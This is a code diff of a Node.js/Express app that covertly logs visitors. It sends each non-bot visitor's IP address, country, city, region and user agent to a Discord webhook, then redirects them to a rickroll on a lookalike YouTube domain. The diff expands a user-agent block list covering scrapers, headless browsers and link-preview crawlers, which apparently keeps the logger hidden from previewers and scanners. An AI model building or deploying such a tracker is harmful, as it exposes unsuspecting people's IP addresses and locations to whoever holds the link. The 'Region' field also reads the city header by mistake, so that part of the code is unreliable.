@@ -7,46 +7,55 @@ const { WebhookClient } = require("discord.js");
 // Setup and middleware
 const webhookClient = new WebhookClient({ url: process.env.URL });
 const app = express();
+
 app.disable("x-powered-by")
 app.use(userAgent.express());
 app.use(express.static(path.join(__dirname, "./public",)))
 
 
 // Decline requests from automated scripts
-const secCheck = (browser) => {
-    const noWayTheseGet200 = ["python-requests", "curl", "unknown", "axios","Vercelbot"];
-    if (noWayTheseGet200.includes(browser)){
-        return false;
-    } else{
-        return true;
-    };
+const isBot = (browser) => {
+    const bots = [
+        "python-requests", "curl", "unknown", "axios", "Vercelbot",
+        "HeadlessChrome", "HeadlessFirefox", "puppeteer", "selenium", "phantomjs",
+        "httpclient", "urllib", "mechanize", "wget", "go-http-client",
+        "Java", "libwww-perl", "Googlebot", "Bingbot", "Yahoo! Slurp",
+        "Baiduspider", "YandexBot", "DuckDuckBot", "MJ12bot",
+        "facebookexternalhit", "Facebot"
+    ];
+    
+    return bots.some(bot => browser.toLowerCase().includes(bot.toLowerCase()));
 };
+
 
 // Main page
 app.get("/", (req, res) => {
-    if (secCheck(req.useragent.browser)){
+    if (!isBot(req.useragent.browser)){
         let payload = {
             title: req.headers["x-forwarded-for"],
             color: 439191,
             fields: [
                 {
                     name: "Country",
-                    value: (req.headers["x-vercel-ip-country"]) ? req.headers["x-vercel-ip-country"] : "N/A"
+                    value: (req.headers["x-vercel-ip-country"]) ? req.headers["x-vercel-ip-country"] : "Unknown"
                 },
                 {
                     name: "City",
-                    value: (req.headers["x-vercel-ip-city"]) ? req.headers["x-vercel-ip-city"] : "N/A"
+                    value: (req.headers["x-vercel-ip-city"]) ? req.headers["x-vercel-ip-city"] : "Unknown"
                 },
                 {
-                    name: "User agent",
-                    value: (req.useragent.source) ? req.useragent.source : "N/A"
+                    name: "Region",
+                    value: (req.headers["x-vercel-ip-country-region"]) ? req.headers["x-vercel-ip-city"] : "Unknown"
+                },
+                {
+                    name: "User Agent",
+                    value: (req.useragent.source) ? req.useragent.source : "Unknown"
                 }
             ]
         };
         webhookClient.send({ embeds: [payload] }).then((response) => {
             res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
         }).catch((err) => {
-            console.log(err);
             res.redirect("https://www.yout-ube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley");
         });
     } else{
@@ -54,9 +63,10 @@ app.get("/", (req, res) => {
     };
 });
 
+
 // No access page
 app.get("/no-access",(req,res) => {
-    res.sendFile(path.join(__dirname, "./public", "no_access.html"));
+    res.sendFile(path.join(__dirname, "./public", "no_access.html")); // I could just send a status code, but this is more fun
 });
 
 // For vercel serverless
